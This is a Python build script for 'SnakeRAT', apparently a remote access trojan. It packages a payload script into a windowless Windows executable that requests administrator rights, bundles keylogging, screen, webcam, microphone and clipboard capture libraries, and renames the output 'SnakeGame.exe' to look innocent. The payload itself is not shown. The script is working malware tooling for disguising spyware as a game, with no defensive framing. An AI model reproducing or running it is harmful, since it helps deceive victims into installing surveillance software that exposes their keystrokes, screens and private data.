#!/usr/bin/env python3
"""
Build script for SnakeRAT executable
"""

import os
import sys
import subprocess
import platform

def main():
    print("=" * 60)
    print("SnakeRAT Builder")
    print("=" * 60)
    
    # Check Python version
    print(f"Python version: {sys.version}")
    
    # Check platform
    system = platform.system().lower()
    print(f"Building for: {system}")
    
    # Install PyInstaller if not present
    try:
        import PyInstaller
        print("PyInstaller found")
    except ImportError:
        print("Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Install dependencies
    print("\nInstalling dependencies...")
    deps = [
        "pygame", "cryptography", "psutil", "netifaces", "pynput",
        "pillow", "opencv-python", "pyaudio", "requests", "pyperclip", "mss"
    ]
    
    if system == 'windows':
        deps.extend(["pywin32", "wmi"])
    
    for dep in deps:
        print(f"Installing {dep}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
    
    # Create icon if not exists
    if not os.path.exists('snake.ico') and system == 'windows':
        print("\nCreating icon file...")
        try:
            from PIL import Image, ImageDraw
            
            # Create a simple snake icon
            img = Image.new('RGB', (64, 64), color=(20, 20, 40))
            draw = ImageDraw.Draw(img)
            draw.rectangle([10, 20, 54, 44], fill=(0, 200, 50))
            draw.ellipse([44, 10, 54, 30], fill=(0, 255, 100))
            draw.ellipse([48, 18, 52, 22], fill=(0, 0, 0))
            draw.ellipse([48, 28, 52, 32], fill=(0, 0, 0))
            
            # Save as ICO
            img.save('snake.ico', format='ICO')
            print("Icon created: snake.ico")
        except Exception as e:
            print(f"Could not create icon: {e}")
    
    # Build with PyInstaller
    print("\nBuilding executable...")
    
    # Common PyInstaller arguments
    args = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--onefile",  # Single executable
        "--clean",
    ]
    
    # Platform-specific arguments
    if system == 'windows':
        args.extend([
            "--windowed",  # No console
            "--uac-admin",  # Request admin privileges
            "--version-file", "version.txt" if os.path.exists("version.txt") else "",
        ])
    
    # Add hidden imports
    hidden_imports = [
        "pygame", "cryptography", "psutil", "netifaces", "pynput.keyboard",
        "pynput.mouse", "PIL", "PIL.Image", "PIL.ImageGrab", "cv2", "pyaudio",
        "requests", "pyperclip", "mss", "win32api", "win32con", "win32process",
        "win32service", "wmi", "pythoncom"
    ]
    
    for hi in hidden_imports:
        args.extend(["--hidden-import", hi])
    
    # Add data files
    if os.path.exists('snake.ico'):
        args.extend(["--icon", "snake.ico"])
    
    # Add the main script
    args.append("d.py")
    
    # Run PyInstaller
    print(f"Running: {' '.join(args)}")
    result = subprocess.run(args)
    
    if result.returncode == 0:
        print("\n" + "=" * 60)
        print("Build successful!")
        print("=" * 60)
        print(f"Executable location: {os.path.join('dist', 'd.exe' if system == 'windows' else 'd')}")
        
        # Rename to something innocent
        exe_name = "SnakeGame.exe" if system == 'windows' else "SnakeGame"
        old_path = os.path.join('dist', 'd.exe' if system == 'windows' else 'd')
        new_path = os.path.join('dist', exe_name)
        
        if os.path.exists(old_path):
            os.rename(old_path, new_path)
            print(f"Renamed to: {new_path}")
    else:
        print("\nBuild failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()